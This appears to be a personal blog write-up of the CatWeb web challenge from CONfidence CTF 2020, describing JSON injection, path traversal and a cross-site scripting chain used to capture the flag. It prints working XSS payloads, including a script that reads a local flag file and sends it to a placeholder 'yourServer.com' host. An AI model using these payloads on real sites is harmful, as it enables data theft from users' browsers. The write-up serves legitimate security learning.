---
title : "CONfidence 2020: CatWeb"
date : 2020-04-23T00:46:19-06:00
draft : false
author : "JamVie"
cover : "img/CONfidenceCover.png"
tags : ["writeups", "web"]
images: ["img/CONfidenceCover.png"]
---

I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills in JSON-related attacks! I have never seen many JSON injections before this, so this was welcome practise. 
<!--more-->

Let's Begin!
----
The link to the webpage is: ```http://catweb.zajebistyc.tf/```

{{< image src="/images/CatWeb_HomePage.png" alt="Login" position="center" style="border-radius: 8px;" >}}

We have a basic webpage with photos of cute cats filtered by their color. The drop down menu will give us black, red, grey and white cats. At the bottom is a report button, which will take whatever input we get, send it to some server, and respond to us that our report has been...well. Reported. 


Checking out the response content as I was clicking about the page showed me the requests for the "kind" (colour) of cats I chose based on the drop down menu. The request was just a small JSON string stipulating what kind I asked for, and I guess the server takes that input and returns whatever. 

```
curl "http://catweb.zajebistyc.tf/cats?kind=grey"
```

That got me thinking, can I ask for cats of a kind not in the drop down menu? 
Editing the request to change the kind from a colour to just absolute garbage...

```
curl "http://catweb.zajebistyc.tf/?kind=djfa"
```

{{< image src="/images/NotFound.png" alt="Login" position="center" style="border-radius: 8px;" >}}

Aha! Our text got echoed back to us in the response. There isn't any input validation in the JSON request! This must be a way in. 

To test how far I could go with it, I decided to hide an XSS in the JSON, seeing as how the URL we are taken to after any sort of response also has the JSON text in it. 

I typed this in as the URL:

```
http://catweb.zajebistyc.tf/?","status":"ok","content":["\"<img src=deadbeef onerror=alert(document.title)> </img>],"ignore":"
```

If there was a JSON vulnerability here, then going to this website would load up an alert with the title of the webpage ("my cats"). What would happen is it would attempt to load an image from the source called "deadbeef", and when it can't find the source, it would load as an error. If the image loaded as an error, pop up an alert with the name of the webpage. 


{{< image src="/images/XSSJsonInCatWeb.png" alt="Login" position="center" style="border-radius: 8px;" >}}


:) Great! There is definitely JSON injection in play here. Let's see what we can do with it! 

Using curl to delve deeper into the webpage, I tried to make it list directories with the command: 

```
curl "http://catweb.zajebistyc.tf/cats?kind=.."
```

{{< image src="/images/CatWebTemplates.png" alt="Login" position="center" style="border-radius: 8px;" >}}

I traversed through the directories, but in the templates subfolder...


{{< image src="/images/CatWebFlagLocn.png" alt="Login" position="center" style="border-radius: 8px;" >}}


Aha! The ```flag.txt``` file is in there. Now we just need to somehow read it from the browser. The fact that I was able to find the local files like this means something: the path of templates looks alot like ```file:///app/templates/flag.txt``` - Note the root path name: file. A same-origin policy here could treat all files with this starting origin as from the same place. 

We can use this to our advantage: create an XSS attack on the ```file://``` path.

Since an XSS endpoint was found using the JSON vulnerabilities in the URL, and there exists a report function, this is all a pretty classic XSS attack from here.


Craft our payload script to fetch the flag.txt from ```file://```. Here's mine called (xss.js):

```javascript
url='http://yourServer.com/6060?'
fetch('file:///app/templates/flag.txt').then(resp=>resp.text()).then(flag=>fetch(url+(btoa(flag) || 'Nothing')));
```


Report this url with our payload in it:

```
file:///app/templates/index.html?", "status": "ok", "content":["\u0022><script src=http://yourServer.com:6060/xss.js></script>"],"ignore":"
```

Now we wait for our server to retrieve the flag for us once someone checks out our reported URL :)

```flag:p4{can_i_haz_a_piece_of_flag_pliz?}```


This was a cool challenge to do that really helped me stretch my XSS skills and teach me how to be thorough when scoping out webpages for possible XSS attacks. I quite enjoyed this challenge! Thank you to [P4](https://p4.team/) for hosting the CONfidence 2020 teaser :) 


Jam 


References
----
feature image credit: [Peng Louis](https://www.pexels.com/@peng-louis-587527) on Pexels